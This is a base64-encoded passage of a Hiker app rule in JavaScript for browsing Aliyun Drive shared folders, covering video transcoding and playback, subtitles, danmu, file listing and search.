2VydmVyQWRkcmVzcyA9IHN0YXJ0UHJveHlTZXJ2ZXIoJC50b1N0cmluZyhhbGlNM3U4UHJveHksIGZpbGVJZCwgYWxpQWNjZXNzQXBpLnNoYXJlSWQsIGFsaUFjY2Vzc0FwaS5zaGFyZVB3ZCwgYWxpQWNjZXNzQXBpLnNoYXJlVG9rZW4sIGFsaUFjY2Vzc0FwaS5hbGlUb2tlbiwgTVlfUlVMRS50aXRsZSkpO1xcbiAgICBsZXQgdHJhbnNjb2RpbmcgPSB7XFxuICAgICAgICBVSEQ6IFxcXCI0SyDotoXmuIVcXFwiLFxcbiAgICAgICAgUUhEOiBcXFwiMksg6LaF5riFXFxcIixcXG4gICAgICAgIEZIRDogXFxcIjEwODAg5YWo6auY5riFXFxcIixcXG4gICAgICAgIEhEOiBcXFwiNzIwIOmrmOa4hVxcXCIsXFxuICAgICAgICBTRDogXFxcIjU0MCDmoIfmuIVcXFwiLFxcbiAgICAgICAgTEQ6IFxcXCIzNjAg5rWB55WFXFxcIlxcbiAgICB9O1xcblxcbiAgICBpZiAocGxheVVybExpc3QubGVuZ3RoID4gMCkge1xcbiAgICAgICAgbGV0IHVybHMgPSBbXSxcXG4gICAgICAgICAgICBuYW1lcyA9IFtdO1xcbiAgICAgICAgcGxheVVybExpc3QuZm9yRWFjaCgoaXRlbSkgPT4ge1xcbiAgICAgICAgICAgIHVybHMucHVzaChzZXJ2ZXJBZGRyZXNzICsgXFxcIj91cmw9XFxcIiArIGJhc2U2NEVuY29kZShpdGVtLnVybCkgKyBcXFwiJnRlbXBsYXRlSWQ9XFxcIiArIGl0ZW0udGVtcGxhdGVfaWQgKyBcXFwiIy5tM3U4XFxcIik7XFxuICAgICAgICAgICAgbmFtZXMucHVzaCh0cmFuc2NvZGluZ1tpdGVtLnRlbXBsYXRlX2lkXSA/IHRyYW5zY29kaW5nW2l0ZW0udGVtcGxhdGVfaWRdIDogaXRlbS50ZW1wbGF0ZV9oZWlnaHQpO1xcbiAgICAgICAgfSk7XFxuICAgICAgICBsZXQgaGVhZHMgPSBuZXcgQXJyYXkocGxheVVybExpc3QubGVuZ3RoKS5maWxsKHtcXG4gICAgICAgICAgICAnUmVmZXJlcic6ICdodHRwczovL3d3dy5hbGl5dW5kcml2ZS5jb20vJ1xcbiAgICAgICAgfSk7XFxuICAgICAgICByZXR1cm4ge1xcbiAgICAgICAgICAgIHVybHM6IHVybHMsXFxuICAgICAgICAgICAgbmFtZXM6IG5hbWVzLFxcbiAgICAgICAgICAgIGhlYWRlcnM6IGhlYWRzLFxcbiAgICAgICAgfTtcXG4gICAgfSBlbHNlIHtcXG4gICAgICAgIHJldHVybiB7fTtcXG4gICAgfVxcblxcbn07XFxuXFxuXFxuZnVuY3Rpb24gZ2V0T3JpVmlkZW8oYWxpQWNjZXNzQXBpLCBmaWxlSWQpIHtcXG4gICAgcmV0dXJuIHtcXG4gICAgICAgIG5hbWVzOiBbXFxcIuWOn+eUu1xcXCJdLFxcbiAgICAgICAgdXJsczogW2FsaUFjY2Vzc0FwaS5nZXRWaWRlb1RlbVBsYXlVcmwoZmlsZUlkKSArIFxcXCIjaXNWaWRlbz10cnVlI1xcXCJdLFxcbiAgICAgICAgaGVhZGVyczogW3tcXG4gICAgICAgICAgICAnUmVmZXJlcic6ICdodHRwczovL3d3dy5hbGl5dW5kcml2ZS5jb20vJ1xcbiAgICAgICAgfV1cXG4gICAgfTtcXG59XFxuJC5leHBvcnRzID0gZnVuY3Rpb24oc2hhcmVJZCwgc2hhcmVQd2QsIHNoYXJlVG9rZW4sIGZpbGVJZCwgY2F0ZSwgemltdSkge1xcbiAgICBpZiAoIWZpbGVFeGlzdChhbGlUb2tlbnNGaWxlcGF0aCkpIHtcXG4gICAgICAgIHRvYXN0KFxcXCLor7flhYjnmbvpmYbnmbvlvZXotKblj7dcXFwiKTtcXG4gICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9wYWdlL2xvZ2luI25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5Iz9ub1JlZnJlc2g9MVxcXCI7XFxuICAgIH1cXG4gICAgbGV0IGFsaVRva2VuID0gJC5yZXF1aXJlKGFsaVRva2Vuc0ZpbGVwYXRoKTtcXG4gICAgaWYgKGNhdGUgPT09IFxcXCJ2aWRlb1xcXCIpIHtcXG4gICAgICAgIGxldCBwbGF5TGlzdCA9IFtdO1xcbiAgICAgICAgbGV0IGFsaUFjY2Vzc0FwaTtcXG4gICAgICAgIGxldCBwbGF5TW9kZSA9IGdldEl0ZW0oXFxcImFsaXl1bl9wbGF5TW9kZVxcXCIsIFxcXCLovaznoIFcXFwiKTtcXG4gICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgYWxpQWNjZXNzQXBpID0gQWxpQWNjZXNzQXBpLmNyZWF0ZURlZmF1bHQoc2hhcmVJZCwgc2hhcmVQd2QsIHNoYXJlVG9rZW4sIGFsaVRva2VuKTtcXG4gICAgICAgICAgICBpZiAocGxheU1vZGUgPT09IFxcXCLovaznoIFcXFwiKSB7XFxuICAgICAgICAgICAgICAgIHBsYXlMaXN0ID0gZ2V0VmlkZW8oYWxpQWNjZXNzQXBpLCBmaWxlSWQpIHx8IHt9O1xcbiAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgIHBsYXlMaXN0ID0gZ2V0T3JpVmlkZW8oYWxpQWNjZXNzQXBpLCBmaWxlSWQpO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgICAgICBsb2coXFxcIiNcXFwiICsgcGxheU1vZGUgKyBcXFwi5pKt5pS+5aSx6LSlI1xcXFxu6ZSZ6K+v5L+h5oGvPlxcXCIgKyBlLnRvU3RyaW5nKCkgKyBcXFwiXFxcXG7plJnor6/ooYw+XFxcIiArIGUubGluZU51bWJlcik7XFxuICAgICAgICAgICAgaWYgKGUuY29kZSA9PT0gXFxcIkludmFsaWRQYXJhbWV0ZXIuUmVmcmVzaFRva2VuXFxcIikge1xcbiAgICAgICAgICAgICAgICB0b2FzdChcXFwi55m76ZmG6L+H5pyf77yM6K+36YeN5paw55m76ZmGXFxcIik7XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9wYWdlL2xvZ2luI25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5Iz9ub1JlZnJlc2g9MVxcXCI7XFxuICAgICAgICAgICAgfSBlbHNlIGlmIChlLmNvZGUgPT09IFxcXCJRdW90YUV4aGF1c3RlZC5Ecml2ZVxcXCIpIHtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+e9keebmOepuumXtOS4jei2s++8jOaXoOazleaSreaUvuivt+a4heeQhuOAglxcXCI7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/mkq3mlL7lpLHotKXvvIzplJnor6/kv6Hmga/lt7LmiZPljbDjgIJcXFxcbuivt+afpeeci+aXpeW/lyhMT0cpXFxcIjtcXG4gICAgICAgIH1cXG5cXG4gICAgICAgIGxldCBtb3VudHN1YiA9IHN0b3JhZ2UwLmdldE15VmFyKCdtb3VudHppbXUnLCB7fSk7XFxuICAgICAgICBpZiAoT2JqZWN0LmtleXMobW91bnRzdWIpLmxlbmd0aCA+IDApIHtcXG4gICAgICAgICAgICB6aW11ID0gbW91bnRzdWI7XFxuICAgICAgICB9XFxuICAgICAgICBsZXQgc3VidGl0bGU7XFxuICAgICAgICBpZiAoT2JqZWN0LmtleXMoemltdSB8fCB7fSkubGVuZ3RoID4gMCAmJiBwbGF5TGlzdCAmJiBwbGF5TGlzdC51cmxzICYmIHBsYXlMaXN0LnVybHMubGVuZ3RoID4gMCkge1xcbiAgICAgICAgICAgIGphdmEubGFuZy5UaHJlYWQuc2xlZXAoMTAwKTtcXG4gICAgICAgICAgICB0cnkge1xcbiAgICAgICAgICAgICAgICB2YXIgem11cmwgPSBhbGlBY2Nlc3NBcGkuZ2V0RmlsZVRvRG93blVybCh6aW11LmZpbGVfaWQpO1xcbiAgICAgICAgICAgICAgICBsZXQgcGF0aCA9ICdoaWtlcjovL2ZpbGVzL2NhY2hlL+S6keebmOWQmy9zdWIuJyArIHppbXUuZXh0O1xcbiAgICAgICAgICAgICAgICBkb3dubG9hZEZpbGUoem11cmwsIHBhdGgsIHtcXG4gICAgICAgICAgICAgICAgICAgICdSZWZlcmVyJzogJ2h0dHBzOi8vd3d3LmFsaXl1bmRyaXZlLmNvbS8nXFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICBzdWJ0aXRsZSA9IGdldFBhdGgocGF0aCk7XFxuICAgICAgICAgICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgICAgICAgICB0b2FzdChcXFwi5a2X5bmV5Yqg6L295aSx6LSlXFxcIik7XFxuICAgICAgICAgICAgICAgIGxvZyhlLm1lc3NhZ2UpO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH1cXG4gICAgICAgIGxldCBkbWxpc3QgPSBzdG9yYWdlMC5nZXRNeVZhcihcXFwiZG1saXN0XFxcIixbXSk7XFxuICAgICAgICBpZihkbWxpc3QubGVuZ3RoPjApe1xcbiAgICAgICAgICAgIHBsYXlMaXN0LmRhbm11ID0gXFxcImhpa2VyOi8vZmlsZXMvY2FjaGUvZGFubXUvXFxcIitkbWxpc3Quc3BsaWNlKDAsIDEpWzBdO1xcbiAgICAgICAgICAgIHN0b3JhZ2UwLnB1dE15VmFyKFxcXCJkbWxpc3RcXFwiLGRtbGlzdCk7XFxuICAgICAgICAgICAgaWYoZG1saXN0Lmxlbmd0aD09PTApe1xcbiAgICAgICAgICAgICAgICB0b2FzdChcXFwi5by55bmV5YiX6KGo5bey5YWo6YOo5oyC6L29XFxcIik7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfVxcbiAgICAgICAgXFxuICAgICAgICBwbGF5TGlzdC5zdWJ0aXRsZSA9IHN1YnRpdGxlO1xcbiAgICAgICAgcmV0dXJuIEpTT04uc3RyaW5naWZ5KHBsYXlMaXN0KTtcXG4gICAgfVxcblxcbiAgICBsZXQgYWxpQWNjZXNzQXBpID0gQWxpQWNjZXNzQXBpLmNyZWF0ZURlZmF1bHQoc2hhcmVJZCwgc2hhcmVQd2QsIHNoYXJlVG9rZW4sIGFsaVRva2VuLCBudWxsKTtcXG4gICAgbGV0IHVybCA9IGFsaUFjY2Vzc0FwaS5nZXRGaWxlVG9Eb3duVXJsKGZpbGVJZCk7XFxuXFxuICAgIGlmIChjYXRlID09PSBcXFwiaW1hZ2VcXFwiKSB7XFxuICAgICAgICByZXR1cm4gdXJsICsgXFxcIiMuanBnXFxcIjtcXG4gICAgfSBlbHNlIGlmIChjYXRlID09PSBcXFwiYXVkaW9cXFwiKSB7XFxuICAgICAgICByZXR1cm4gdXJsICsgXFxcIiNpc011c2ljPXRydWUjXFxcIjtcXG4gICAgfSBlbHNlIHtcXG4gICAgICAgIHJldHVybiBcXFwiZG93bmxvYWQ6Ly9cXFwiICsgdXJsO1xcbiAgICB9XFxufVwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi6Zi/6YeM5YiX6KGoXCIsXCJwYXRoXCI6XCJhbGl5dW5cIixcInJ1bGVcIjpcImpzOlxcbi8vQGF1dGhvciBMb3lEZ0lrXFxuY29uc3QgQWxpU2hhcmVBcGkgPSAkLnJlcXVpcmUoXFxcIkFsaUFwaVxcXCIpO1xcblxcbmxldCByZWFsdXJsID0gZGVjb2RlVVJJQ29tcG9uZW50KGdldFBhcmFtKFxcXCJyZWFsdXJsXFxcIiwgXFxcIlxcXCIpKS5zcGxpdChcXFwiP1xcXCIpWzBdO1xcbmxldCB1cmxEYXRhID0gcmVhbHVybC5zcGxpdChcXFwiL1xcXCIpO1xcbi8vaHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tL3Mve3NoYXJlSWR9L2ZvbGRlci97ZmlsZUlkfT87XFxuXFxubGV0IHNoYXJlSWQgPSBNWV9QQVJBTVMuc2hhcmVJZCB8fCB1cmxEYXRhWzRdO1xcbmxldCBzaGFyZVB3ZCA9IGdldFBhcmFtKFxcXCJzaGFyZVB3ZFxcXCIsIE1ZX1BBUkFNUy5zaGFyZVB3ZCB8fCBcXFwiXFxcIik7XFxubGV0IHNoYXJlVG9rZW4gPSBnZXRQYXJhbShcXFwic2hhcmVUb2tlblxcXCIsIE1ZX1BBUkFNUy5zaGFyZVRva2VuKTtcXG5cXG5sZXQgZmlsZUlkID0gKHVybERhdGFbNV0gPT09IFxcXCJmb2xkZXJcXFwiID8gdXJsRGF0YVs2XSA6IHZvaWQgMCkgfHwgTVlfUEFSQU1TLmZpbGVJZDtcXG5sZXQgc2VhcmNoS2V5ID0gZGVjb2RlVVJJQ29tcG9uZW50KGdldFBhcmFtKFxcXCJzZWFyY2hLZXlcXFwiLCBcXFwiXFxcIikpIHx8IHVuZGVmaW5lZDtcXG5sZXQgaXNTZWFyY2ggPSAhIXNlYXJjaEtleTtcXG5cXG5mdW5jdGlvbiBmb3JtYXREYXRlKF9kYXRlLCBmbXQpIHtcXG4gICAgbGV0IGRhdGUgPSAhaXNOYU4oX2RhdGUpID8gbmV3IERhdGUoX2RhdGUgKiAxMDAwKSA6IG5ldyBEYXRlKF9kYXRlKTtcXG4gICAgcmV0dXJuICQuZGF0ZUZvcm1hdChkYXRlLCBmbXQgfHwgXFxcInl5eXktTU0tZGQgSEg6bW06c3NcXFwiKVxcbn1cXG5zZXRQYWdlUGljVXJsKCk7XFxuXFxuZnVuY3Rpb24gZm9ybWF0U2l6ZShzaXplKSB7XFxuICAgIGlmICghc2l6ZSkge1xcbiAgICAgICAgcmV0dXJuICcnO1xcbiAgICB9XFxuICAgIGNvbnN0IHVuaXRzID0gWydCJywgJ0tCJywgJ01CJywgJ0dCJywgJ1RCJywgJ1BCJywgJ0VCJywgJ1pCJywgJ1lCJ107XFxuICAgIGxldCBpID0gMDtcXG4gICAgd2hpbGUgKHNpemUgPj0gMTAyNCkge1xcbiAgICAgICAgc2l6ZSAvPSAxMDI0O1xcbiAgICAgICAgaSsrO1xcbiAgICB9XFxuICAgIHNpemUgPSBpID8gTnVtYmVyKHNpemUudG9GaXhlZCgyKSkgOiBzaXplO1xcbiAgICByZXR1cm4gYCR7c2l6ZX0gJHt1bml0c1tpXX1gO1xcbn1cXG5cXG5mdW5jdGlvbiBzZXRNeVBhQ2FjaGUoa2V5LCB2YWx1ZSkge1xcbiAgICBNWV9QQVJBTVNba2V5XSA9IHZhbHVlO1xcbn1cXG5cXG5mdW5jdGlvbiBzYXZlTXlQYUNhY2hlKCkge1xcbiAgICBzZXRQYWdlUGFyYW1zKE1ZX1BBUkFNUyk7XFxufVxcblxcbmZ1bmN0aW9uIHNldE1hcmtlcihtYXJrZXIpIHtcXG4gICAgc2V0TXlQYUNhY2hlKFxcXCJtYXJrZXJcXFwiLCBtYXJrZXIpO1xcbn1cXG5cXG5mdW5jdGlvbiBzZXRUb2tlbihzaGFyZVRva2VuKSB7XFxuICAgIHNldE15UGFDYWNoZShcXFwic2hhcmVUb2tlblxcXCIsIHNoYXJlVG9rZW4pO1xcbn1cXG4vKlxcbmZ1bmN0aW9uIHNldFZpZGVvSXRlbUNhY2hlKHZpZGVvSXRlbUNhY2hlKSB7XFxuICAgIHNldE15UGFDYWNoZShcXFwidmlkZW9JdGVtQ2FjaGVcXFwiLCB2aWRlb0l0ZW1DYWNoZSk7XFxufVxcblxcbmZ1bmN0aW9uIHNldFN1YnRpdGxlQ2FjaGUoc3VidGl0bGVDYWNoZSkge1xcbiAgICBzZXRNeVBhQ2FjaGUoXFxcInN1YnRpdGxlQ2FjaGVcXFwiLCBzdWJ0aXRsZUNhY2hlKTtcXG59Ki9cXG5cXG5sZXQgaWNvblR5cGUgPSBcXFwiYWl8YXBrfGF2aXxjc3N8ZG1nfGV4ZXxmbHZ8Z2lmfGhpa2VyfGh0bWx8aXNvfGpwZ3xqc3xqc29ufGxvZ3xtb3Z8bXAzfG1wNHxvdGZ8cGhwfHBuZ3xwcHR8cHNkfHRhYmxlfHR4dHx3YXZ8eGxzfHppcHxjc3N8ZG9jfGVwdWJ8ZXhjfGh0bXx4bHN4XFxcIi5zcGxpdCgnfCcpO1xcblxcbmZ1bmN0aW9uIGdldEljb24oZXh0LCB0eXBlKSB7XFxuICAgIGxldCByb290ID0gXFxcImh0dHBzOi8vZ2l0Y29kZS5uZXQvcXFfMzIzOTQzNTEvZHIvLS9yYXcvbWFzdGVyL2ltZy/mlofku7bnsbvlnosyL1xcXCI7XFxuICAgIGlmICh0eXBlID09PSBcXFwiZm9sZGVyXFxcIikge1xcbiAgICAgICAgcmV0dXJuIHJvb3QgKyBcXFwi5paH5Lu25aS5LnN2Z1xcXCI7XFxuICAgIH1cXG4gICAgaWYgKGljb25UeXBlLmluY2x1ZGVzKChleHQgfHwgXFxcIlxcXCIpLnRvTG93ZXJDYXNlKCkpKSB7XFxuICAgICAgICByZXR1cm4gcm9vdCArIGV4dCArIFxcXCIuc3ZnXFxcIjtcXG4gICAgfVxcbiAgICByZXR1cm4gcm9vdCArIFxcXCLmlofku7Yuc3ZnXFxcIjtcXG5cXG59XFxuXFxuZnVuY3Rpb24gbG9hZChpdGVtcykge1xcbiAgICBsZXQgYWxpU2hhcmVBcGkgPSBuZXcgQWxpU2hhcmVBcGkoc2hhcmVJZCwgc2hhcmVQd2QsIHNoYXJlVG9rZW4sIChzaGFyZVRva2VuKSA9PiB7XFxuICAgICAgICBzZXRUb2tlbihzaGFyZVRva2VuKTtcXG4gICAgICAgIE1ZX1BBUkFNUy5zaGFyZVRva2VuID0gc2hhcmVUb2tlbjtcXG4gICAgfSk7XFxuICAgIGxldCBvcmRlcnMgPSB7XFxuICAgICAgICBcXFwi5ZCN56ew5q2j5bqPXFxcIjogXFxcIm5hbWUjQVNDXFxcIixcXG4gICAgICAgIFxcXCLlkI3np7DlgJLluo9cXFwiOiBcXFwibmFtZSNERVNDXFxcIixcXG4gICAgICAgIFxcXCLml7bpl7TmraPluo9cXFwiOiBcXFwidXBkYXRlZF9hdCNBU0NcXFwiLFxcbiAgICAgICAgXFxcIuaXtumXtOWAkuW6j1xcXCI6IFxcXCJ1cGRhdGVkX2F0I0RFU0NcXFwiLFxcbiAgICAgICAgXFxcIuWkp+Wwj+ato+W6j1xcXCI6IFxcXCJzaXplI0FTQ1xcXCIsXFxuICAgICAgICBcXFwi5aSn5bCP5YCS5bqPXFxcIjogXFxcInNpemUjREVTQ1xcXCJcXG4gICAgfTtcXG4gICAgbGV0IG9yZGVyc0tleXMgPSBPYmplY3Qua2V5cyhvcmRlcnMpO1xcbiAgICBsZXQgb3JkZXJOYW1lID0gZ2V0SXRlbShcXFwiYWxpeXVuX29yZGVyXFxcIiwgb3JkZXJzS2V5c1swXSk7XFxuICAgIGxldCBvcmRlciA9IG9yZGVyc1tvcmRlck5hbWVdLnNwbGl0KFxcXCIjXFxcIik7XFxuICAgIGxldCBzdHlsZXMgPSBbXFxcInRleHRfMVxcXCIsIFxcXCJtb3ZpZV8yXFxcIiwgXFxcImNhcmRfcGljXzNcXFwiLCBcXFwiYXZhdGFyXFxcIi8qLCBcXFwi6L+95YmnXFxcIiovXTtcXG4gICAgbGV0IHN0eWxlID0gZ2V0SXRlbShcXFwiYWxpeXVuX3N0eWxlXFxcIiwgc3R5bGVzWzBdKTtcXG4gICAgaWYgKE1ZX1BBR0UgPT09IDEpIHtcXG4gICAgICAgIGlmICghZ2V0TXlWYXIoXFxcIm1vdW50emltdVxcXCIsIFxcXCJcXFwiKSkge1xcbiAgICAgICAgICAgIHN0b3JhZ2UwLnB1dE15VmFyKFxcXCJtb3VudHppbXVcXFwiLCB7fSk7XFxuICAgICAgICAgICAgYWRkTGlzdGVuZXIoXFxcIm9uQ2xvc2VcXFwiLCAkLnRvU3RyaW5nKCgpID0+IHtcXG4gICAgICAgICAgICAgICAgY2xlYXJNeVZhcihcXFwibW91bnR6aW11XFxcIik7XFxuICAgICAgICAgICAgICAgIGNsZWFyTXlWYXIoXFxcImFsaVNoYXJlVG9rZW5cXFwiKTtcXG4gICAgICAgICAgICAgICAgY2xlYXJWYXIoXFxcImRtX3NoYXJlXFxcIik7XFxuICAgICAgICAgICAgICAgIGNsZWFyTXlWYXIoXFxcImRtbGlzdFxcXCIpO1xcbiAgICAgICAgICAgIH0pKTtcXG4gICAgICAgIH1cXG4gICAgICAgIHNldE1hcmtlcigpO1xcbiAgICAgICAgaWYgKHJlYWx1cmwgJiYgIWlzU2VhcmNoKSB7XFxuICAgICAgICAgICAgbGV0IHNoYXJlSW5mbyA9IGFsaVNoYXJlQXBpLmdldFNoYXJlSW5mbygpO1xcblxcbiAgICAgICAgICAgIGxldCBmaWxlSW5mbyA9IHNoYXJlSW5mby5maWxlX2luZm9zO1xcbiAgICAgICAgICAgIGlmIChmaWxlSW5mby5sZW5ndGggPT09IDEgJiYgZmlsZUluZm9bMF0udHlwZSA9PT0gXFxcImZvbGRlclxcXCIgJiYgIWZpbGVJZCkge1xcbiAgICAgICAgICAgICAgICBmaWxlSWQgPSBmaWxlSW5mb1swXS5maWxlX2lkO1xcbiAgICAgICAgICAgICAgICBzZXRQYWdlVGl0bGUoZmlsZUluZm9bMF0uZmlsZV9uYW1lKTtcXG4gICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICBzZXRQYWdlVGl0bGUoc2hhcmVJbmZvLnNoYXJlX25hbWUpO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBsZXQgZGVhZGxpbmUgPSBcXFwi5rC45LmF5pyJ5pWIXFxcIjtcXG5cXG4gICAgICAgICAgICBpZiAoc2hhcmVJbmZvLmV4cGlyYXRpb24pIHtcXG4gICAgICAgICAgICAgICAgZGVhZGxpbmUgPSBcXFwi5pyJ5pWI6Iez77yaXFxcIiArIGZvcm1hdERhdGUoc2hhcmVJbmZvLmV4cGlyYXRpb24pO1xcbiAgICAgICAgICAgICAgICAvL3NoYXJlSW5mby51cGRhdGVkX2F0XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIGl0ZW1zLnB1c2goe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogKHNoYXJlSW5mby5jcmVhdG9yX25hbWUgfHwgc2hhcmVJbmZvLmNyZWF0b3JfcGhvbmUpICsgXFxcIiZuYnNwOyZuYnNwO1xcXCIgKyBkZWFkbGluZS5zbWFsbCgpLFxcbiAgICAgICAgICAgICAgICB1cmw6IHJlYWx1cmwgKyBcXFwiI25vSGlzdG9yeSNcXFwiLFxcbiAgICAgICAgICAgICAgICBpbWc6IHNoYXJlSW5mby5hdmF0YXIsXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFwiYXZhdGFyXFxcIlxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgfVxcbiAgICAgICAgaWYgKCFpc1NlYXJjaCkge1xcbiAgICAgICAgICAgIGl0ZW1zLnB1c2goe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcIuaQnOe0olxcXCIsXFxuICAgICAgICAgICAgICAgIHVybDogJC50b1N0cmluZygoKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICBpbnB1dCA9IGlucHV0LnRyaW0oKTtcXG4gICAgICAgICAgICAgICAgICAgIGlmICghaW5wdXQpIHJldHVybiBcXFwidG9hc3Q6Ly/or7fovpPlhaXlhbPplK7or41cXFwiO1xcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL3BhZ2UvYWxpeXVuI25vSGlzdG9yeSMjZnVsbFRoZW1lIz9wYWdlPWZ5cGFnZSZzZWFyY2hLZXk9XFxcIiArIGVuY29kZVVSSUNvbXBvbmVudChpbnB1dCk7XFxuICAgICAgICAgICAgICAgIH0pLFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcImlucHV0XFxcIixcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgICAgIHNoYXJlUHdkOiBzaGFyZVB3ZCxcXG4gICAgICAgICAgICAgICAgICAgIHNoYXJlSWQ6IHNoYXJlSWQsXFxuICAgICAgICAgICAgICAgICAgICBzaGFyZVRva2VuOiBzaGFyZVRva2VuXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgaXRlbXMucHVzaCh7XFxuICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi4oCc4oCcXFxcIiArIHNlYXJjaEtleSArIFxcXCLigJ3igJ3nmoTmkJzntKLnu5PmnpxcXFwiLFxcbiAgICAgICAgICAgICAgICB1cmw6IFxcXCJoaWtlcjovL2VtcHR5XFxcIixcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0X2NlbnRlcl8xXFxcIixcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZVxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICB9XFxuICAgICAgICBsZXQgZnVuU3R5bGUgPSBpc1NlYXJjaCA/IFxcXCJpY29uX3NtYWxsXzNcXFwiIDogXFxcImljb25fcm91bmRfc21hbGxfNFxcXCI7XFxuICAgICAgICBpdGVtcy5wdXNoKHtcXG4gICAgICAgICAgICB0aXRsZTogc3R5bGUsXFxuICAgICAgICAgICAgdXJsOiAkKHN0eWxlcywgMSwgXFxcIuaOkuW4g+agt+W8j1xcXCIpLnNlbGVjdCgoKSA9PiB7XFxuICAgICAgICAgICAgICAgIHNldEl0ZW0oXFxcImFsaXl1bl9zdHlsZVxcXCIsIGlucHV0KTtcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+W3suWIh+aNolxcXCI7XFxuICAgICAgICAgICAgfSksXFxuICAgICAgICAgICAgY29sX3R5cGU6IGZ1blN0eWxlLFxcbiAgICAgICAgICAgIHBpY191cmw6IFxcXCJodHRwczovL2hpa2VyZmFucy5jb20vaW1nL2FsaV9pY29uLnN2Z1xcXCJcXG4gICAgICAgIH0sIHtcXG4gICAgICAgICAgICB0aXRsZTogb3JkZXJOYW1lLFxcbiAgICAgICAgICAgIHVybDogJChvcmRlcnNLZXlzLCAyLCBcXFwi5o6S5bqP5pa55byPXFxcIikuc2VsZWN0KCgpID0+IHtcXG4gICAgICAgICAgICAgICAgc2V0SXRlbShcXFwiYWxpeXVuX29yZGVyXFxcIiwgaW5wdXQpO1xcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5YiH5o2i5oiQ5YqfXFxcIjtcXG4gICAgICAgICAgICB9KSxcXG4gICAgICAgICAgICBjb2xfdHlwZTogZnVuU3R5bGUsXFxuICAgICAgICAgICAgcGljX3VybDogXFxcImh0dHBzOi8vaGlrZXJmYW5zLmNvbS9pbWcvYWxpX3NvcnQuc3ZnXFxcIlxcbiAgICAgICAgfSwge1xcbiAgICAgICAgICAgIHRpdGxlOiBnZXRJdGVtKFxcXCJhbGl5dW5fcGxheU1vZGVcXFwiLCBcXFwi6L2s56CBXFxcIiksXFxuICAgICAgICAgICAgdXJsOiAkKFtcXFwi6L2s56CBXFxcIiwgXFxcIuWOn+eUu1xcXCJdLCAyLCBcXFwi5pKt5pS+5qih5byPXFxcIikuc2VsZWN0KCgpID0+IHtcXG4gICAgICAgICAgICAgICAgc2V0SXRlbShcXFwiYWxpeXVuX3BsYXlNb2RlXFxcIiwgaW5wdXQpO1xcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5YiH5o2i5oiQ5YqfXFxcIjtcXG4gICAgICAgICAgICB9KSxcXG4gICAgICAgICAgICBjb2xfdHlwZTogZnVuU3R5bGUsXFxuICAgICAgICAgICAgcGljX3VybDogXFxcImh0dHBzOi8vaGlrZXJmYW5zLmNvbS9pbWcvYWxpX3BsYXkuc3ZnXFxcIlxcbiAgICAgICAgfSk7XFxuICAgICAgICBpZiAoIWlzU2VhcmNoKSB7XFxuICAgICAgICAgICAgaXRlbXMucHVzaCh7XFxuICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi5Yqf6IO9XFxcIixcXG4gICAgICAgICAgICAgICAgdXJsOiAkKFtcXFwi6L2s5a2Y5LqR55uYXFxcIiwgXFxcIueZu+mZhui0puWPt1xcXCIsIFxcXCLlpI3liLbliIbkuqvpk77mjqVcXFwiLCBcXFwi5p+l55yL5omL5Yqo5oyC6L295a2X5bmVXFxcIiwgXFxcIuiOt+WPluW8ueW5leaQnOe0ouinhOWImVxcXCIsIFxcXCLmibnph4/mjILovb3mnKzlnLDlvLnluZVcXFwiXSwgMiwgXFxcIuabtOWkmuWKn+iDvVxcXCIpLnNlbGVjdCgoc2hhcmVJZCwgc2hhcmVQd2QsIGZpbGVJZCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgc3dpdGNoIChpbnB1dCkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgXFxcIui9rOWtmOS6keebmFxcXCI6XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBgc21hcnRkcml2ZTovL3NoYXJlL2Jyb